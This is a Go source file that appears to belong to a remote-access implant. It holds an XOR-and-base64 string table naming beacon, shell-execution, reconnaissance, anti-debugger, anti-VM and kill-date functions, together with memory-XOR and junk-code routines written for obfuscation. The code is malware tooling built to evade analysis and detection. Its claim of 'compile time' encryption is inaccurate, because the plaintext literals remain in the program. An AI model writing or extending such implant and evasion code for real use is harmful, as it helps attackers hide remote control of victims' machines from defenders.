package main

import (
	"encoding/base64"
	"unsafe"
)

// Key for string obfuscation - should be randomly generated at build time
var obfKey = []byte{0x4a, 0x72, 0x8e, 0x91, 0x3c, 0x55, 0x7f, 0x29, 0x82, 0x6d, 0x4b, 0xe1, 0x93, 0x5a, 0x8c, 0x67}

// XOR encryption/decryption function
func xorCrypt(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// Obfuscated string storage - these are encrypted at "compile time"
var obfStrings = map[string]string{
	// Network related
	"grpc_dial":     base64.StdEncoding.EncodeToString(xorCrypt([]byte("failed to connect"), obfKey)),
	"reg_fail":      base64.StdEncoding.EncodeToString(xorCrypt([]byte("registration failed"), obfKey)),
	"reg_reject":    base64.StdEncoding.EncodeToString(xorCrypt([]byte("registration rejected"), obfKey)),
	"stream_estab":  base64.StdEncoding.EncodeToString(xorCrypt([]byte("Stream established"), obfKey)),
	"stream_closed": base64.StdEncoding.EncodeToString(xorCrypt([]byte("Stream closed by server"), obfKey)),
	"beacon_fail":   base64.StdEncoding.EncodeToString(xorCrypt([]byte("Failed to send heartbeat"), obfKey)),
	"alive":         base64.StdEncoding.EncodeToString(xorCrypt([]byte("alive"), obfKey)),

	// Command execution
	"cmd_exec":    base64.StdEncoding.EncodeToString(xorCrypt([]byte("Executing command"), obfKey)),
	"cmd_error":   base64.StdEncoding.EncodeToString(xorCrypt([]byte("Command execution error"), obfKey)),
	"cmd_success": base64.StdEncoding.EncodeToString(xorCrypt([]byte("Command executed successfully"), obfKey)),
	"unknown_cmd": base64.StdEncoding.EncodeToString(xorCrypt([]byte("unknown command type"), obfKey)),

	// System commands
	"cmd_c":        base64.StdEncoding.EncodeToString(xorCrypt([]byte("cmd"), obfKey)),
	"sh_c":         base64.StdEncoding.EncodeToString(xorCrypt([]byte("sh"), obfKey)),
	"powershell":   base64.StdEncoding.EncodeToString(xorCrypt([]byte("powershell"), obfKey)),
	"tasklist":     base64.StdEncoding.EncodeToString(xorCrypt([]byte("tasklist"), obfKey)),
	"ps_aux":       base64.StdEncoding.EncodeToString(xorCrypt([]byte("ps"), obfKey)),
	"hostname_cmd": base64.StdEncoding.EncodeToString(xorCrypt([]byte("hostname"), obfKey)),
	"whoami":       base64.StdEncoding.EncodeToString(xorCrypt([]byte("whoami"), obfKey)),
	"ping":         base64.StdEncoding.EncodeToString(xorCrypt([]byte("ping"), obfKey)),
	"ver":          base64.StdEncoding.EncodeToString(xorCrypt([]byte("ver"), obfKey)),
	"uname":        base64.StdEncoding.EncodeToString(xorCrypt([]byte("uname"), obfKey)),
	"locale":       base64.StdEncoding.EncodeToString(xorCrypt([]byte("locale"), obfKey)),
	"id":           base64.StdEncoding.EncodeToString(xorCrypt([]byte("id"), obfKey)),

	// Evasion related
	"debugger_det": base64.StdEncoding.EncodeToString(xorCrypt([]byte("Debugger detected, exiting..."), obfKey)),
	"vm_detected":  base64.StdEncoding.EncodeToString(xorCrypt([]byte("VM environment detected, exiting..."), obfKey)),
	"kill_date":    base64.StdEncoding.EncodeToString(xorCrypt([]byte("Kill date reached, exiting..."), obfKey)),
	"pty_disabled": base64.StdEncoding.EncodeToString(xorCrypt([]byte("PTY support disabled in this implant"), obfKey)),

	// File paths and indicators
	"dmi_path":      base64.StdEncoding.EncodeToString(xorCrypt([]byte("/sys/class/dmi/id/product_name"), obfKey)),
	"kernel32":      base64.StdEncoding.EncodeToString(xorCrypt([]byte("kernel32.dll"), obfKey)),
	"isdbg_present": base64.StdEncoding.EncodeToString(xorCrypt([]byte("IsDebuggerPresent"), obfKey)),

	// Module related
	"mod_loaded":     base64.StdEncoding.EncodeToString(xorCrypt([]byte("Module '%s' loaded successfully"), obfKey)),
	"mod_started":    base64.StdEncoding.EncodeToString(xorCrypt([]byte("Module '%s' started successfully"), obfKey)),
	"mod_stopped":    base64.StdEncoding.EncodeToString(xorCrypt([]byte("Module '%s' stopped successfully"), obfKey)),
	"mod_configured": base64.StdEncoding.EncodeToString(xorCrypt([]byte("Module '%s' configured successfully"), obfKey)),
	"mod_not_found":  base64.StdEncoding.EncodeToString(xorCrypt([]byte("module %s not found"), obfKey)),
	"mod_exists":     base64.StdEncoding.EncodeToString(xorCrypt([]byte("module %s already registered"), obfKey)),

	// Error messages
	"error_prefix":   base64.StdEncoding.EncodeToString(xorCrypt([]byte("Error: "), obfKey)),
	"sleep_updated":  base64.StdEncoding.EncodeToString(xorCrypt([]byte("Sleep interval updated"), obfKey)),
	"no_sleep":       base64.StdEncoding.EncodeToString(xorCrypt([]byte("no sleep interval provided"), obfKey)),
	"no_target":      base64.StdEncoding.EncodeToString(xorCrypt([]byte("no target specified for network scan"), obfKey)),
	"screenshot_ni":  base64.StdEncoding.EncodeToString(xorCrypt([]byte("Screenshot functionality not implemented"), obfKey)),
	"powershell_win": base64.StdEncoding.EncodeToString(xorCrypt([]byte("PowerShell only available on Windows"), obfKey)),
}

// Decrypt and return obfuscated string
func deobfStr(key string) string {
	encoded, exists := obfStrings[key]
	if !exists {
		return key // Fallback to original if not found
	}

	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return key // Fallback on decode error
	}

	return string(xorCrypt(decoded, obfKey))
}

// Memory manipulation functions for runtime obfuscation
func memXor(ptr uintptr, size int, key byte) {
	slice := (*[1 << 30]byte)(unsafe.Pointer(ptr))[:size:size]
	for i := 0; i < size; i++ {
		slice[i] ^= key
	}
}

// Simple junk operation for basic obfuscation
func simpleJunk() {
	for i := 0; i < 10; i++ {
		_ = i * 2
	}
}
